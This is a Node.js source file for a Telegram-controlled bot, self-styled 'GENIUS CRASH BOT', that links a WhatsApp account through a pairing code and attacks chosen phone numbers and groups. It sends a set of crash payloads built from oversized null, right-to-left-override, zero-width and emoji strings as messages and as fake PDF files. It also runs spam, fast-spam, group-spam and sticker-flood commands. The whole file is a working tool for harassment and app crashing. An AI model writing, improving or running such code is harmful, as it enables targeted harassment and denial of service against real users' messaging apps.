require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { WA } = require('./lib/wa');
const fs = require('fs');
const http = require('http');

// --- RENDER HEALTH CHECK SERVER ---
// This stops Render from killing the bot for "No open ports detected"
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running');
}).listen(PORT, () => console.log(`✅ Health check listening on port ${PORT}`));

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
if (!TOKEN) { console.log('❌ Environment variable TELEGRAM_BOT_TOKEN is missing!'); process.exit(1); }

const bot = new TelegramBot(TOKEN, { polling: true });
const wa = new WA();

const CRASH_PAYLOADS = [
    Buffer.alloc(65000, 0).toString('utf-8'), 
    '\u202E'.repeat(30000),                   
    '🪇🪇🪇🪇🪇🪇🪇🪇🪇🪇'.repeat(5000),          
    'X'.repeat(65535),                        
    '\u200B'.repeat(50000)                    
];
const SPAM_TEXT = "🔥 GENIUS BOT WAS HERE 🔥";

if (wa.hasSession()) {
    console.log('♻️ Saved WhatsApp session mila - connect ho raha hai...');
    wa.start().catch(e => console.log('WA start error:', e.message));
}

setInterval(() => {
    if (wa.state === 'offline' && !wa.stopped && wa.hasSession()) {
        console.log('🐕 Watchdog: WhatsApp offline tha, reconnect kar raha hu...');
        wa.start().catch(e => console.log('WA restart error:', e.message));
    }
}, 120000);

bot.on('polling_error', e => console.log('[telegram]', e.message));

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || !text.startsWith('/')) return;

    const args = text.split(' ');
    const command = args[0].toLowerCase();

    if (command === '/start') {
        return bot.sendMessage(chatId, `💀 **GENIUS CRASH BOT** 💀\n\n/link <number> - Connect WhatsApp\n/crash <number> - Crash target\n/spam <number> - Spam target\n/fastspam <number> - Fast Spam\n/sticker <number> - Sticker Spam\n/groupspam <id> - Group Spam`, { parse_mode: 'Markdown' });
    }

    if (command === '/link') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /link 919876543210');
        const phone = args[1].replace(/\D/g, '');
        
        if (wa.sock && wa.state === 'online') {
            return bot.sendMessage(chatId, '✅ WhatsApp is already connected.');
        }

        bot.sendMessage(chatId, `⏳ Generating pairing code for +${phone}... Please wait.`);
        
        try {
            const sock = await wa.start();
            let pairingRequested = false;

            // FIX: Wait for the connection to be ready before requesting the code
            sock.ev.on('connection.update', async (update) => {
                const { connection, qr } = update;
                
                if ((connection === 'connecting' || qr) && !pairingRequested) {
                    pairingRequested = true;
                    try {
                        const code = await sock.requestPairingCode(phone);
                        bot.sendMessage(chatId, `🔑 **WhatsApp Code:** \`${code}\`\n\nWhatsApp -> Linked Devices -> Link with Phone Number`, { parse_mode: 'Markdown' });
                    } catch (err) {
                        bot.sendMessage(chatId, `❌ Pairing failed: ${err.message}. Try /link again.`);
                    }
                }
                
                if (connection === 'open') {
                    bot.sendMessage(chatId, '✅ WhatsApp connected successfully!');
                }
            });
        } catch (e) {
            bot.sendMessage(chatId, `❌ Error: ${e.message}`);
        }
        return;
    }

    if (!wa.sock || wa.state !== 'online') {
        return bot.sendMessage(chatId, '❌ WhatsApp is not connected. Use `/link <number>` first.');
    }

    if (command === '/crash') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /crash 919876543210');
        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
        bot.sendMessage(chatId, `💀 Sending crash to +${args[1]}...`);
        for (let p of CRASH_PAYLOADS) {
            try {
                await wa.sock.sendMessage(target, { text: p });
                await wa.sock.sendMessage(target, { document: Buffer.from(p), mimetype: 'application/pdf', fileName: 'crash.pdf' });
            } catch (e) {}
            await new Promise(r => setTimeout(r, 500));
        }
        bot.sendMessage(chatId, '✅ Crash done.');
    }

    if (command === '/spam') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /spam 919876543210');
        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
        bot.sendMessage(chatId, `🚀 Spamming +${args[1]}...`);
        for (let i = 0; i < 30; i++) {
            try {
                await wa.sock.sendMessage(target, { text: `${SPAM_TEXT} [${i+1}]` });
            } catch (e) {}
            await new Promise(r => setTimeout(r, 1000));
        }
        bot.sendMessage(chatId, '✅ Spam done.');
    }

    if (command === '/fastspam') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /fastspam 919876543210');
        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
        bot.sendMessage(chatId, `⚡ FAST Spamming +${args[1]}...`);
        const promises = [];
        for (let i = 0; i < 20; i++) {
            promises.push(wa.sock.sendMessage(target, { text: `FAST SPAM [${i+1}]` }).catch(() => {}));
        }
        await Promise.all(promises);
        bot.sendMessage(chatId, '✅ Fast spam done.');
    }

    if (command === '/groupspam') {
        const groupId = args[1];
        if (!groupId || !groupId.includes('@g.us')) return bot.sendMessage(chatId, '❌ Format: /groupspam 123456789-123456@g.us');
        bot.sendMessage(chatId, `🚀 Spamming Group...`);
        for (let i = 0; i < 50; i++) {
            try {
                await wa.sock.sendMessage(groupId, { text: `${SPAM_TEXT} [${i+1}]` });
            } catch (e) {}
            await new Promise(r => setTimeout(r, 800));
        }
        bot.sendMessage(chatId, '✅ Group spam done.');
    }

    if (command === '/sticker') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /sticker 919876543210');
        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
        try {
            const buffer = fs.readFileSync('./assets/sticker.webp');
            bot.sendMessage(chatId, `🧸 Sticker Spam on +${args[1]}...`);
            for (let i = 0; i < 30; i++) {
                try {
                    await wa.sock.sendMessage(target, { sticker: buffer });
                } catch (e) {}
                await new Promise(r => setTimeout(r, 300));
            }
            bot.sendMessage(chatId, '✅ Sticker spam done.');
        } catch (e) {
            bot.sendMessage(chatId, '❌ Error: assets/sticker.webp not found.');
        }
    }
});
